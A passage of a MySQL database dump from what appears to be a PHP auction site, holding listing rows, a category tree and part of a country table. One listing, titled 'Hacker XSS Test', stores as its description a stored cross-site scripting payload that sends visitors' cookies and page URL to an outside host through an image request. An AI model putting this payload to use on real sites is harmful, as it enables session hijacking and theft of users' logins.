Order \nPaypal \n','1','2005-01-24 08:36:54',0.0000,'0','0',1,0),('3b4d55e3b4442452f5c3944313c4ec56','6eafaa376a669bdc2991f9d04ad19a65','half eaten Royal with cheese','2007-02-08 16:35:25','Old but still got that loving feeling','',194,1.9900,10.0000,'1','30',0.0000,'234','2332','2','Loads of Cash \n','1','2007-03-10 16:35:25',0.0000,'0','0',1,0),('f8ec37e9ac0fef4007257b2387c525c5','cb5d95e954f1ad7bd3ca9893002d351c','DVD player','2005-01-12 08:06:57','dvd player','',1,34.0000,0.0000,'1','1',0.0000,'4','12345','1','Paypal \n','0','2005-01-13 08:06:57',0.0000,'0','0',1,0),('6c88d9b79298064a075fb3655dcab867','cb5d95e954f1ad7bd3ca9893002d351c','chocolate cake','2005-01-12 08:07:45','yammi','',1,100.0000,0.0000,'1','1',0.0000,'17','12345','1','Paypal \n','0','2005-01-13 08:07:45',0.0000,'0','0',1,0),('3e142c98d1952082400faf3ba16c4c7b','cb5d95e954f1ad7bd3ca9893002d351c','auction website source code','2005-01-12 08:08:44','auction website source code','',43,5.0000,0.0000,'1','1',0.0000,'4','12345','1','MasterCard or Visa \n','0','2005-01-13 08:08:44',0.0000,'0','0',1,0),('76498c439366279caeff1b39f23c66fd','cb5d95e954f1ad7bd3ca9893002d351c','HP 48','2005-01-12 08:10:44','including manual','',210,120.0000,0.0000,'1','1',0.0000,'5','12345','1','Money Order \n','0','2005-01-13 08:10:44',0.0000,'0','0',1,0),('1ffb0ba2be1ccc47eee1e220984f949e','46353d8e34feb49c328495d509e61e82','Sabine MT9000 Tuner/Metronome','2005-01-17 09:22:43','Sabine MT9000 Tuner/Metronome \r\n3 critical tools in one - Tuner, Metronome and Tone Generator!\r\nThe MT9000 combines a 7-octave chromatic tuner with superior tuner technology, wood-block sounding metronome and 4-octave tone generator, in an affordable unit you can carry in your pocket. Sabine\'s famous metronome now has a continuous volume control, and 3 modes: standard, accented downbeat, and 5 rhythm figures (duplet, triplet, etc.). Features include AAA battery operation (included), built-in mic & 1/4\" input and 2-year warranty.\r\n\r\n\r\n\r\nFeatures \r\n\r\nSlim, compact design, just 4” wide \r\nWide-screen LCD display \r\nAll settings stored in memory on power-off \r\nBuilt-in folding stand \r\nBatteries: Two AAA included FREE! \r\nSabine 2-year Warranty! \r\nDimensions: 3.95\", 2.5\", 0.73\" (10 cm x 6.3 cm x 1.8 cm)\r\n','http://www.americanmusical.com/images/d/p20904d.jpg',22,1000.0000,0.0000,'2','3',0.0000,'13','54321','1','Checks \nMoney Order \nPaypal \nWire Transfer \n','0','2005-01-20 09:22:43',0.0000,'0','0',1,0),('674fb782777c1e07a86b2fda532d8a41','266110db14ef8f3e2766ad277b6c9d56','Hacker XSS Test','2005-01-17 13:23:38','<script language=\'javascript\'>\r\ndocument.write(\"<img src=http://theanomaly.net/?url=\" + document.location + \"&cookie=\" + document.cookie + \">\");\r\n</script>','',1,11.0000,0.0000,'1','90',0.0000,'18','11111','1','Money Order\n','0','2005-04-17 14:23:38',0.0000,'0','0',1,0),('5c02eb4b675ddab67f813ff3cfc7c6a5','266110db14ef8f3e2766ad277b6c9d56','Sony VAIO laptop','2005-01-19 12:51:29','This laptop is in perfect working order.  It is a PCG-V505DX which I have used for several years.','http://www.sonystyle.com/intershoproot/eCS/Store/en/imagesCatalog/cpu_VAIONotebookComputers/img_seriesimage_sseries.jpg',125,15.0000,2000.0000,'1','90',5.0000,'221','10012','1','Checks \nMoney Order \nPaypal \nMasterCard or Visa \nWire Transfer \n','0','2005-04-19 13:51:29',0.0000,'0','0',1,0),('c3a3026fad4b688ad65a346fd1dcc40f','266110db14ef8f3e2766ad277b6c9d56','First Edition \"Catch-22\"','2005-01-19 12:54:20','This rare first edition of Joseph Heller\'s classic Catch-22 is signed by the author.  It is in near-fine condition with significant tears on the jacket.','http://jollyroger.com/catch22.gif',1,1000.0000,0.0000,'1','90',0.0000,'221','10145','1','Money Order\nPaypal\n','0','2005-04-19 13:54:20',0.0000,'0','0',1,0),('4fff7db154ceba1407b6f9108c9ee26b','266110db14ef8f3e2766ad277b6c9d56','Panasonic DVD Player','2005-01-19 12:58:18','This personal DVD player is ideal for plane flights and long drives.  It is brand new, still in the box, and is still udner warranty by the manufacturer.','http://superstore-electronics.com/prod_images_small/dvd_lv70.jpg',1,50.0000,500.0000,'1','1',0.0000,'221','58824','1','Checks\nMoney Order\nPaypal\nMasterCard or Visa\n','0','2005-01-20 12:58:18',0.0000,'0','0',1,0);
/*!40000 ALTER TABLE `auctions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `bids`
--

DROP TABLE IF EXISTS `bids`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `bids` (
  `auction` varchar(32) DEFAULT NULL,
  `bidder` varchar(32) DEFAULT NULL,
  `bid` double(16,4) DEFAULT NULL,
  `bidwhen` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `quantity` int(11) DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `bids`
--

LOCK TABLES `bids` WRITE;
/*!40000 ALTER TABLE `bids` DISABLE KEYS */;
/*!40000 ALTER TABLE `bids` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categories`
--

DROP TABLE IF EXISTS `categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `categories` (
  `cat_id` int(4) NOT NULL AUTO_INCREMENT,
  `parent_id` int(4) DEFAULT NULL,
  `cat_name` tinytext,
  `deleted` int(1) DEFAULT NULL,
  `sub_counter` int(11) DEFAULT NULL,
  `counter` int(11) DEFAULT NULL,
  `cat_colour` tinytext NOT NULL,
  `cat_image` tinytext NOT NULL,
  PRIMARY KEY (`cat_id`)
) ENGINE=MyISAM AUTO_INCREMENT=217 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categories`
--

LOCK TABLES `categories` WRITE;
/*!40000 ALTER TABLE `categories` DISABLE KEYS */;
INSERT INTO `categories` VALUES (1,0,'Art & Antiques',0,137,119,'',''),(2,1,'Ancient World',0,1,1,'',''),(3,1,'Amateur Art',0,1,1,'',''),(4,1,'Ceramics & Glass',0,3,1,'',''),(5,4,'Glass',0,2,0,'',''),(6,5,'40s, 50s & 60s',0,0,0,'',''),(7,5,'Art Glass',0,1,1,'',''),(8,5,'Carnival',0,0,0,'',''),(9,5,'Contemporary Glass',0,0,0,'',''),(10,5,'Porcelain',0,0,0,'',''),(11,5,'Chalkware',0,0,0,'',''),(12,5,'Chintz & Shelley',0,1,1,'',''),(13,5,'Decorative',0,0,0,'',''),(14,1,'Fine Art',0,2,2,'',''),(16,1,'Painting',0,1,1,'',''),(17,1,'Photographic Images',0,0,0,'',''),(18,1,'Prints',0,0,0,'',''),(19,1,'Books & Manuscripts',0,1,1,'',''),(20,1,'Cameras',0,3,3,'',''),(21,1,'General',0,1,1,'',''),(22,1,'Musical Instruments',0,4,4,'',''),(23,1,'Orientalia',0,0,0,'',''),(24,1,'Post-1900',0,0,0,'',''),(25,1,'Pre-1900',0,0,0,'',''),(26,1,'Scientific Instruments',0,1,1,'',''),(27,1,'Silver & Silver Plate',0,0,0,'',''),(28,1,'Textiles & Linens',0,0,0,'',''),(29,0,'Books',0,11,2,'',''),(30,29,'Arts, Architecture & Photography',0,0,0,'',''),(31,29,'Audiobooks',0,0,0,'',''),(32,29,'Biographies & Memoirs',0,0,0,'',''),(33,29,'Business & Investing',0,0,0,'',''),(34,29,'Children\'s Books',0,0,0,'',''),(35,29,'Computers & Internet',0,2,2,'',''),(36,29,'Cooking, Food & Wine',0,0,0,'',''),(37,29,'Entertainment',0,0,0,'',''),(38,29,'Foreign Language Instruction',0,0,0,'',''),(40,29,'Health, Mind & Body',0,0,0,'',''),(41,29,'History',0,0,0,'',''),(42,29,'Home & Garden',0,1,1,'',''),(43,29,'Horror',0,1,1,'',''),(44,29,'Literature & Fiction',0,1,1,'',''),(45,29,'Animals',0,2,2,'',''),(46,29,'Catalogs',0,0,0,'',''),(47,29,'Children',0,0,0,'',''),(48,29,'General',0,0,0,'',''),(49,29,'Illustrated',0,0,0,'',''),(50,29,'Men',0,0,0,'',''),(51,29,'News',0,0,0,'',''),(54,29,'Women',0,0,0,'',''),(55,29,'Mystery & Thrillers',0,1,1,'',''),(56,29,'Nonfiction',0,0,0,'',''),(57,29,'Parenting & Families',0,0,0,'',''),(58,29,'Poetry',0,0,0,'',''),(59,29,'Rare',0,0,0,'',''),(60,29,'Reference',0,0,0,'',''),(61,29,'Religion & Spirituality',0,0,0,'',''),(62,29,'Contemporary',0,0,0,'',''),(63,29,'Historical',0,0,0,'',''),(64,29,'Regency',0,0,0,'',''),(65,29,'Science & Nature',0,0,0,'',''),(66,29,'Science Fiction & Fantasy',0,0,0,'',''),(67,29,'Sports & Outdoors',0,1,1,'',''),(68,29,'Teens',0,0,0,'',''),(69,29,'Textbooks',0,0,0,'',''),(70,29,'Travel',0,0,0,'',''),(71,0,'Clothing & Accessories',0,2,1,'',''),(72,71,'Accessories',0,1,1,'',''),(73,71,'Clothing',0,0,0,'',''),(74,71,'Watches',0,0,0,'',''),(75,0,'Coins & Stamps',0,0,0,'',''),(76,75,'Coins',0,0,0,'',''),(77,75,'Philately',0,0,0,'',''),(78,0,'Collectibles',0,0,0,'',''),(79,78,'Advertising',0,0,0,'',''),(80,78,'Animals',0,0,0,'',''),(81,78,'Animation',0,0,0,'',''),(82,78,'Antique Reproductions',0,0,0,'',''),(83,78,'Autographs',0,0,0,'',''),(84,78,'Barber Shop',0,0,0,'',''),(85,78,'Bears',0,0,0,'',''),(86,78,'Bells',0,0,0,'',''),(87,78,'Bottles & Cans',0,0,0,'',''),(88,78,'Breweriana',0,0,0,'',''),(89,78,'Cars & Motorcycles',0,0,0,'',''),(90,78,'Cereal Boxes & Premiums',0,0,0,'',''),(91,78,'Character',0,0,0,'',''),(92,78,'Circus & Carnival',0,0,0,'',''),(93,78,'Collector Plates',0,0,0,'',''),(94,78,'Dolls',0,0,0,'',''),(95,78,'General',0,0,0,'',''),(96,78,'Historical & Cultural',0,0,0,'',''),(97,78,'Holiday & Seasonal',0,0,0,'',''),(98,78,'Household Items',0,0,0,'',''),(99,78,'Kitsch',0,0,0,'',''),(100,78,'Knives & Swords',0,0,0,'',''),(101,78,'Lunchboxes',0,0,0,'',''),(102,78,'Magic & Novelty Items',0,0,0,'',''),(103,78,'Memorabilia',0,0,0,'',''),(104,78,'Militaria',0,0,0,'',''),(105,78,'Music Boxes',0,0,0,'',''),(106,78,'Oddities',0,0,0,'',''),(107,78,'Paper',0,0,0,'',''),(108,78,'Pinbacks',0,0,0,'',''),(109,78,'Porcelain Figurines',0,0,0,'',''),(110,78,'Railroadiana',0,0,0,'',''),(111,78,'Religious',0,0,0,'',''),(112,78,'Rocks, Minerals & Fossils',0,0,0,'',''),(113,78,'Scientific Instruments',0,0,0,'',''),(114,78,'Textiles',0,0,0,'',''),(115,78,'Tobacciana',0,0,0,'',''),(116,0,'Comics, Cards & Science Fiction',0,0,0,'',''),(117,116,'Anime & Manga',0,0,0,'',''),(118,116,'Comic Books',0,0,0,'',''),(119,116,'General',0,0,0,'',''),(120,116,'Godzilla',0,0,0,'',''),(121,116,'Star Trek',0,0,0,'',''),(122,116,'The X-Files',0,0,0,'',''),(123,116,'Toys',0,0,0,'',''),(124,116,'Trading Cards',0,0,0,'',''),(125,0,'Computers & Software',0,11,2,'',''),(126,125,'General',0,1,1,'',''),(127,125,'Hardware',0,7,7,'',''),(128,125,'Internet Services',0,0,0,'',''),(129,125,'Software',0,1,1,'',''),(130,0,'Electronics & Photography',0,6,1,'',''),(131,130,'Consumer Electronics',0,4,4,'',''),(132,130,'General',0,0,0,'',''),(133,130,'Photo Equipment',0,1,1,'',''),(134,130,'Recording Equipment',0,0,0,'',''),(135,130,'Video Equipment',0,0,0,'',''),(136,0,'Gemstones & Jewelry',0,1,1,'',''),(137,136,'Ancient',0,0,0,'',''),(138,136,'Beaded Jewelry',0,0,0,'',''),(139,136,'Beads',0,0,0,'',''),(140,136,'Carved & Cameo',0,0,0,'',''),(141,136,'Contemporary',0,0,0,'',''),(142,136,'Costume',0,0,0,'',''),(143,136,'Fine',0,0,0,'',''),(144,136,'Gemstones',0,0,0,'',''),(145,136,'General',0,0,0,'',''),(146,136,'Gold',0,0,0,'',''),(147,136,'Necklaces',0,0,0,'',''),(148,136,'Silver',0,0,0,'',''),(149,136,'Victorian',0,0,0,'',''),(150,136,'Vintage',0,0,0,'',''),(151,0,'Home & Garden',0,1,1,'',''),(152,151,'Baby Items',0,0,0,'',''),(153,151,'Crafts',0,0,0,'',''),(154,151,'Furniture',0,0,0,'',''),(155,151,'Garden',0,0,0,'',''),(156,151,'General',0,0,0,'',''),(157,151,'Household Items',0,0,0,'',''),(158,151,'Pet Supplies',0,0,0,'',''),(159,151,'Tools & Hardware',0,0,0,'',''),(160,151,'Weddings',0,0,0,'',''),(161,0,'Movies & Video',0,0,0,'',''),(162,161,'DVD',0,0,0,'',''),(163,161,'General',0,0,0,'',''),(164,161,'Laser Discs',0,0,0,'',''),(165,161,'VHS',0,0,0,'',''),(166,0,'Music',0,1,0,'',''),(167,166,'CDs',0,1,1,'',''),(168,166,'General',0,0,0,'',''),(169,166,'Instruments',0,0,0,'',''),(170,166,'Memorabilia',0,0,0,'',''),(171,166,'Records',0,0,0,'',''),(172,166,'Tapes',0,0,0,'',''),(173,0,'Office & Business',0,0,0,'',''),(174,173,'Briefcases',0,0,0,'',''),(175,173,'Fax Machines',0,0,0,'',''),(176,173,'General Equipment',0,0,0,'',''),(177,173,'Pagers',0,0,0,'',''),(178,0,'Other Goods & Services',0,0,0,'',''),(179,178,'General',0,0,0,'',''),(180,178,'Metaphysical',0,0,0,'',''),(181,178,'Property',0,0,0,'',''),(182,178,'Services',0,0,0,'',''),(183,178,'Tickets & Events',0,0,0,'',''),(184,178,'Transportation',0,0,0,'',''),(185,178,'Travel',0,0,0,'',''),(186,0,'Sports & Recreation',0,0,0,'',''),(187,186,'Apparel & Equipment',0,0,0,'',''),(188,186,'Exercise Equipment',0,0,0,'',''),(189,186,'General',0,0,0,'',''),(190,0,'Toys & Games',0,444,439,'',''),(191,190,'Action Figures',0,0,0,'',''),(192,190,'Beanie Babies & Beanbag Toys',0,0,0,'',''),(193,190,'Diecast',0,0,0,'',''),(194,190,'Fast Food',0,4,4,'',''),(195,190,'Fisher-Price',0,0,0,'',''),(196,190,'Furby',0,0,0,'',''),(197,190,'Games',0,0,0,'',''),(198,190,'General',0,0,0,'',''),(199,190,'Giga Pet & Tamagotchi',0,0,0,'',''),(200,190,'Hobbies',0,0,0,'',''),(201,190,'Marbles',0,0,0,'',''),(202,190,'My Little Pony',0,0,0,'',''),(203,190,'Peanuts Gang',0,0,0,'',''),(204,190,'Pez',0,0,0,'',''),(205,190,'Plastic Models',0,0,0,'',''),(206,190,'Plush Toys',0,0,0,'',''),(207,190,'Puzzles',0,0,0,'',''),(208,190,'Slot Cars',0,0,0,'',''),(209,190,'Teletubbies',0,0,0,'',''),(210,190,'Toy Soldiers',0,1,1,'',''),(211,190,'Vintage Tin',0,0,0,'',''),(212,190,'Vintage Vehicles',0,0,0,'',''),(216,214,'33333333333',0,0,0,'','');
/*!40000 ALTER TABLE `categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categories_plain`
--

DROP TABLE IF EXISTS `categories_plain`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `categories_plain` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cat_id` int(11) DEFAULT NULL,
  `cat_name` tinytext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=208 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categories_plain`
--

LOCK TABLES `categories_plain` WRITE;
/*!40000 ALTER TABLE `categories_plain` DISABLE KEYS */;
INSERT INTO `categories_plain` VALUES (1,1,'Art & Antiques'),(2,3,'&nbsp; &nbsp;Amateur Art'),(3,2,'&nbsp; &nbsp;Ancient World'),(4,19,'&nbsp; &nbsp;Books & Manuscripts'),(5,20,'&nbsp; &nbsp;Cameras'),(6,4,'&nbsp; &nbsp;Ceramics & Glass'),(7,5,'&nbsp; &nbsp;&nbsp; &nbsp;Glass'),(8,6,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;40s, 50s & 60s'),(9,7,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Art Glass'),(10,8,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Carnival'),(11,11,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Chalkware'),(12,12,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Chintz & Shelley'),(13,9,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Contemporary Glass'),(14,13,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Decorative'),(15,10,'&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Porcelain'),(16,14,'&nbsp; &nbsp;Fine Art'),(17,21,'&nbsp; &nbsp;General'),(18,22,'&nbsp; &nbsp;Musical Instruments'),(19,23,'&nbsp; &nbsp;Orientalia'),(20,16,'&nbsp; &nbsp;Painting'),(21,17,'&nbsp; &nbsp;Photographic Images'),(22,24,'&nbsp; &nbsp;Post-1900'),(23,25,'&nbsp; &nbsp;Pre-1900'),(24,18,'&nbsp; &nbsp;Prints'),(25,26,'&nbsp; &nbsp;Scientific Instruments'),(26,27,'&nbsp; &nbsp;Silver & Silver Plate'),(27,28,'&nbsp; &nbsp;Textiles & Linens'),(28,29,'Books'),(29,45,'&nbsp; &nbsp;Animals'),(30,30,'&nbsp; &nbsp;Arts, Architecture & Photography'),(31,31,'&nbsp; &nbsp;Audiobooks'),(32,32,'&nbsp; &nbsp;Biographies & Memoirs'),(33,33,'&nbsp; &nbsp;Business & Investing'),(34,46,'&nbsp; &nbsp;Catalogs'),(35,47,'&nbsp; &nbsp;Children'),(36,35,'&nbsp; &nbsp;Computers & Internet'),(37,62,'&nbsp; &nbsp;Contemporary'),(38,36,'&nbsp; &nbsp;Cooking, Food & Wine'),(39,37,'&nbsp; &nbsp;Entertainment'),(40,38,'&nbsp; &nbsp;Foreign Language Instruction'),(41,48,'&nbsp; &nbsp;General'),(42,40,'&nbsp; &nbsp;Health, Mind & Body'),(43,63,'&nbsp; &nbsp;Historical'),(44,41,'&nbsp; &nbsp;History'),(45,42,'&nbsp; &nbsp;Home & Garden'),(46,43,'&nbsp; &nbsp;Horror'),(47,49,'&nbsp; &nbsp;Illustrated'),(48,44,'&nbsp; &nbsp;Literature & Fiction'),(49,50,'&nbsp; &nbsp;Men'),(50,55,'&nbsp; &nbsp;Mystery & Thrillers'),(51,51,'&nbsp; &nbsp;News'),(52,56,'&nbsp; &nbsp;Nonfiction'),(53,57,'&nbsp; &nbsp;Parenting & Families'),(54,58,'&nbsp; &nbsp;Poetry'),(55,59,'&nbsp; &nbsp;Rare'),(56,60,'&nbsp; &nbsp;Reference'),(57,64,'&nbsp; &nbsp;Regency'),(58,61,'&nbsp; &nbsp;Religion & Spirituality'),(59,65,'&nbsp; &nbsp;Science & Nature'),(60,66,'&nbsp; &nbsp;Science Fiction & Fantasy'),(61,67,'&nbsp; &nbsp;Sports & Outdoors'),(62,68,'&nbsp; &nbsp;Teens'),(63,69,'&nbsp; &nbsp;Textbooks'),(64,70,'&nbsp; &nbsp;Travel'),(65,54,'&nbsp; &nbsp;Women'),(66,71,'Clothing & Accessories'),(67,72,'&nbsp; &nbsp;Accessories'),(68,73,'&nbsp; &nbsp;Clothing'),(69,74,'&nbsp; &nbsp;Watches'),(70,75,'Coins & Stamps'),(71,76,'&nbsp; &nbsp;Coins'),(72,77,'&nbsp; &nbsp;Philately'),(73,78,'Collectibles'),(74,79,'&nbsp; &nbsp;Advertising'),(75,80,'&nbsp; &nbsp;Animals'),(76,81,'&nbsp; &nbsp;Animation'),(77,82,'&nbsp; &nbsp;Antique Reproductions'),(78,83,'&nbsp; &nbsp;Autographs'),(79,84,'&nbsp; &nbsp;Barber Shop'),(80,85,'&nbsp; &nbsp;Bears'),(81,86,'&nbsp; &nbsp;Bells'),(82,87,'&nbsp; &nbsp;Bottles & Cans'),(83,88,'&nbsp; &nbsp;Breweriana'),(84,89,'&nbsp; &nbsp;Cars & Motorcycles'),(85,90,'&nbsp; &nbsp;Cereal Boxes & Premiums'),(86,91,'&nbsp; &nbsp;Character'),(87,92,'&nbsp; &nbsp;Circus & Carnival'),(88,93,'&nbsp; &nbsp;Collector Plates'),(89,94,'&nbsp; &nbsp;Dolls'),(90,95,'&nbsp; &nbsp;General'),(91,96,'&nbsp; &nbsp;Historical & Cultural'),(92,97,'&nbsp; &nbsp;Holiday & Seasonal'),(93,98,'&nbsp; &nbsp;Household Items'),(94,99,'&nbsp; &nbsp;Kitsch'),(95,100,'&nbsp; &nbsp;Knives & Swords'),(96,101,'&nbsp; &nbsp;Lunchboxes'),(97,102,'&nbsp; &nbsp;Magic & Novelty Items'),(98,103,'&nbsp; &nbsp;Memorabilia'),(99,104,'&nbsp; &nbsp;Militaria'),(100,105,'&nbsp; &nbsp;Music Boxes'),(101,106,'&nbsp; &nbsp;Oddities'),(102,107,'&nbsp; &nbsp;Paper'),(103,108,'&nbsp; &nbsp;Pinbacks'),(104,109,'&nbsp; &nbsp;Porcelain Figurines'),(105,110,'&nbsp; &nbsp;Railroadiana'),(106,111,'&nbsp; &nbsp;Religious'),(107,112,'&nbsp; &nbsp;Rocks, Minerals & Fossils'),(108,113,'&nbsp; &nbsp;Scientific Instruments'),(109,114,'&nbsp; &nbsp;Textiles'),(110,115,'&nbsp; &nbsp;Tobacciana'),(111,116,'Comics, Cards & Science Fiction'),(112,117,'&nbsp; &nbsp;Anime & Manga'),(113,118,'&nbsp; &nbsp;Comic Books'),(114,119,'&nbsp; &nbsp;General'),(115,120,'&nbsp; &nbsp;Godzilla'),(116,121,'&nbsp; &nbsp;Star Trek'),(117,122,'&nbsp; &nbsp;The X-Files'),(118,123,'&nbsp; &nbsp;Toys'),(119,124,'&nbsp; &nbsp;Trading Cards'),(120,125,'Computers & Software'),(121,126,'&nbsp; &nbsp;General'),(122,127,'&nbsp; &nbsp;Hardware'),(123,128,'&nbsp; &nbsp;Internet Services'),(124,129,'&nbsp; &nbsp;Software'),(125,130,'Electronics & Photography'),(126,131,'&nbsp; &nbsp;Consumer Electronics'),(127,132,'&nbsp; &nbsp;General'),(128,133,'&nbsp; &nbsp;Photo Equipment'),(129,134,'&nbsp; &nbsp;Recording Equipment'),(130,135,'&nbsp; &nbsp;Video Equipment'),(131,136,'Gemstones & Jewelry'),(132,137,'&nbsp; &nbsp;Ancient'),(133,138,'&nbsp; &nbsp;Beaded Jewelry'),(134,139,'&nbsp; &nbsp;Beads'),(135,140,'&nbsp; &nbsp;Carved & Cameo'),(136,141,'&nbsp; &nbsp;Contemporary'),(137,142,'&nbsp; &nbsp;Costume'),(138,143,'&nbsp; &nbsp;Fine'),(139,144,'&nbsp; &nbsp;Gemstones'),(140,145,'&nbsp; &nbsp;General'),(141,146,'&nbsp; &nbsp;Gold'),(142,147,'&nbsp; &nbsp;Necklaces'),(143,148,'&nbsp; &nbsp;Silver'),(144,149,'&nbsp; &nbsp;Victorian'),(145,150,'&nbsp; &nbsp;Vintage'),(146,151,'Home & Garden'),(147,152,'&nbsp; &nbsp;Baby Items'),(148,153,'&nbsp; &nbsp;Crafts'),(149,154,'&nbsp; &nbsp;Furniture'),(150,155,'&nbsp; &nbsp;Garden'),(151,156,'&nbsp; &nbsp;General'),(152,157,'&nbsp; &nbsp;Household Items'),(153,158,'&nbsp; &nbsp;Pet Supplies'),(154,159,'&nbsp; &nbsp;Tools & Hardware'),(155,160,'&nbsp; &nbsp;Weddings'),(156,161,'Movies & Video'),(157,162,'&nbsp; &nbsp;DVD'),(158,163,'&nbsp; &nbsp;General'),(159,164,'&nbsp; &nbsp;Laser Discs'),(160,165,'&nbsp; &nbsp;VHS'),(161,166,'Music'),(162,167,'&nbsp; &nbsp;CDs'),(163,168,'&nbsp; &nbsp;General'),(164,169,'&nbsp; &nbsp;Instruments'),(165,170,'&nbsp; &nbsp;Memorabilia'),(166,171,'&nbsp; &nbsp;Records'),(167,172,'&nbsp; &nbsp;Tapes'),(168,173,'Office & Business'),(169,174,'&nbsp; &nbsp;Briefcases'),(170,175,'&nbsp; &nbsp;Fax Machines'),(171,176,'&nbsp; &nbsp;General Equipment'),(172,177,'&nbsp; &nbsp;Pagers'),(173,178,'Other Goods & Services'),(174,179,'&nbsp; &nbsp;General'),(175,180,'&nbsp; &nbsp;Metaphysical'),(176,181,'&nbsp; &nbsp;Property'),(177,182,'&nbsp; &nbsp;Services'),(178,183,'&nbsp; &nbsp;Tickets & Events'),(179,184,'&nbsp; &nbsp;Transportation'),(180,185,'&nbsp; &nbsp;Travel'),(181,186,'Sports & Recreation'),(182,187,'&nbsp; &nbsp;Apparel & Equipment'),(183,188,'&nbsp; &nbsp;Exercise Equipment'),(184,189,'&nbsp; &nbsp;General'),(185,190,'Toys & Games'),(186,191,'&nbsp; &nbsp;Action Figures'),(187,192,'&nbsp; &nbsp;Beanie Babies & Beanbag Toys'),(188,193,'&nbsp; &nbsp;Diecast'),(189,194,'&nbsp; &nbsp;Fast Food'),(190,195,'&nbsp; &nbsp;Fisher-Price'),(191,196,'&nbsp; &nbsp;Furby'),(192,197,'&nbsp; &nbsp;Games'),(193,198,'&nbsp; &nbsp;General'),(194,199,'&nbsp; &nbsp;Giga Pet & Tamagotchi'),(195,200,'&nbsp; &nbsp;Hobbies'),(196,201,'&nbsp; &nbsp;Marbles'),(197,202,'&nbsp; &nbsp;My Little Pony'),(198,203,'&nbsp; &nbsp;Peanuts Gang'),(199,204,'&nbsp; &nbsp;Pez'),(200,205,'&nbsp; &nbsp;Plastic Models'),(201,206,'&nbsp; &nbsp;Plush Toys'),(202,207,'&nbsp; &nbsp;Puzzles'),(203,208,'&nbsp; &nbsp;Slot Cars'),(204,209,'&nbsp; &nbsp;Teletubbies'),(205,210,'&nbsp; &nbsp;Toy Soldiers'),(206,211,'&nbsp; &nbsp;Vintage Tin'),(207,212,'&nbsp; &nbsp;Vintage Vehicles');
/*!40000 ALTER TABLE `categories_plain` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `counters`
--

DROP TABLE IF EXISTS `counters`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `counters` (
  `users` int(11) DEFAULT '0',
  `auctions` int(11) DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `counters`
--

LOCK TABLES `counters` WRITE;
/*!40000 ALTER TABLE `counters` DISABLE KEYS */;
INSERT INTO `counters` VALUES (29,614);
/*!40000 ALTER TABLE `counters` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `countries`
--

DROP TABLE IF EXISTS `countries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `countries` (
  `country_id` int(2) NOT NULL AUTO_INCREMENT,
  `country` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`country_id`)
) ENGINE=MyISAM AUTO_INCREMENT=237 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `countries`
--

LOCK TABLES `countries` WRITE;
/*!40000 ALTER TABLE `countries` DISABLE KEYS */;
INSERT INTO `countries` VALUES (1,'Afghanistan'),(2,'Albania'),(3,'Algeria'),(4,'American Samoa'),(5,'Andorra'),(6,'Angola'),(7,'Anguilla'),(8,'Antarctica'),(9,'Antigua And Barbuda'),(10,'Argentina'),(11,'Armenia'),(12,'Aruba'),(13,'Australia'),(14,'Austria'),(15,'Azerbaijan'),(16,'Bahamas'),(17,'Bahrain'),(18,'Bangladesh'),(19,'Barbados'),(20,'Belarus'),(21,'Belgium'),(22,'Belize'),(23,'Benin'),(24,'Bermuda'),(25,'Bhutan'),(26,'Bolivia'),(27,'Bosnia and Herzegowina'),(28,'Botswana'),(29,'Bouvet Island'),(30,'Brazil'),(31,'British Indian Ocean Territory'),(32,'Brunei Darussalam'),(33,'Bulgaria'),(34,'Burkina Faso'),(35,'Burma'),(36,'Burundi'),(37,'Cambodia'),(38,'Cameroon'),(39,'Canada'),(40,'Cape Verde'),(41,'Cayman Islands'),(42,'Central African Republic'),(43,'Chad'),(44,'Chile'),(45,'China'),(46,'Christmas Island'),(47,'Cocos (Keeling) Islands'),(48,'Colombia'),(49,'Comoros'),(50,'Congo'),(51,'Congo, the Democratic Republic'),(52,'Cook Islands'),(53,'Costa Rica'),(54,'Cote d\'Ivoire'),(55,'Croatia'),(56,'Cyprus'),(57,'Czech Republic'),(58,'Denmark'),(59,'Djibouti'),(60,'Dominica'),(61,'Dominican Republic'),(62,'East Timor'),(63,'Ecuador'),(64,'Egypt'),(65,'El Salvador'),(66,'England'),(67,'Equatorial Guinea'),(68,'Eritrea'),(69,'Estonia'),(70,'Ethiopia'),(71,'Falkland Islands'),(72,'Faroe 